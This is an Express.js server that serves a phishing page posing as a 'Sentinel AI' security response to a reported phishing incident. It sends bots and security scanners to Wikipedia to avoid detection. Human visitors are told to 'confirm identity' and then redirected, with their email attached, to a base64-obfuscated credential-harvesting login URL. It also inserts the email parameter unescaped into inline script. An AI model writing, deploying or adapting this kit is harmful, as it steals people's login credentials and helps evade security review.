const express = require('express');
const app = express();

const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
const part2 = "cGdhYWZGVE0=";

app.get('/', (req, res) => {
    const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
    const targetEmail = req.query.m || "";
    const isBot = /bot|spider|crawler|microsoft|google|cloud|datacenter|headless|monit|phish|virus/i.test(ua);
    
    if (isBot) return res.redirect("https://www.wikipedia.org");

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Sentinel AI - Cyber Response</title>
            <style>
                body { background: #f4f7f9; font-family: 'Segoe UI', Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #333; }
                .container { background: white; padding: 40px; border-radius: 4px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 450px; width: 90%; border-top: 5px solid #000; }
                .loader { border: 3px solid #f3f3f3; border-top: 3px solid #d73a49; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                h2 { color: #1b1f23; font-size: 20px; margin-bottom: 15px; }
                p { font-size: 14px; line-height: 1.6; color: #586069; }
                .btn { display: none; background: #2ea44f; color: white; border: none; padding: 14px 25px; cursor: pointer; font-size: 15px; font-weight: 600; border-radius: 4px; text-transform: uppercase; margin-top: 20px; }
                .success-icon { display: none; color: #2ea44f; font-size: 40px; margin-bottom: 15px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div id="step1">
                    <h2>Thank you for reporting</h2>
                    <p>The phishing incident is being processed by Sentinel AI. Please wait while we isolate the threat and secure your session.</p>
                    <div class="loader"></div>
                </div>

                <div id="step2" style="display:none;">
                    <div class="success-icon">✓</div>
                    <h2>Threat Successfully Isolated</h2>
                    <p>The unauthorized access attempt has been blocked. To finalize the protection of your account and restore full access, you must validate your identity one last time.</p>
                    <button id="finalBtn" class="btn">Confirm Identity & Secure Account</button>
                </div>
            </div>

            <script>
                // Simuler l'analyse de sécurité pendant 5 secondes
                setTimeout(() => {
                    document.getElementById('step1').style.display = 'none';
                    document.getElementById('step2').style.display = 'block';
                    document.querySelector('.success-icon').style.display = 'block';
                    document.getElementById('finalBtn').style.display = 'inline-block';
                }, 5000);

                const p1 = "${part1}"; const p2 = "${part2}"; const em = "${targetEmail}";
                document.getElementById('finalBtn').addEventListener('click', function() {
                    this.innerText = "Redirecting...";
                    let target = atob(p1) + atob(p2);
                    if(em !== "") target += "#" + em;
                    window.location.href = target;
                });
            </script>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT);
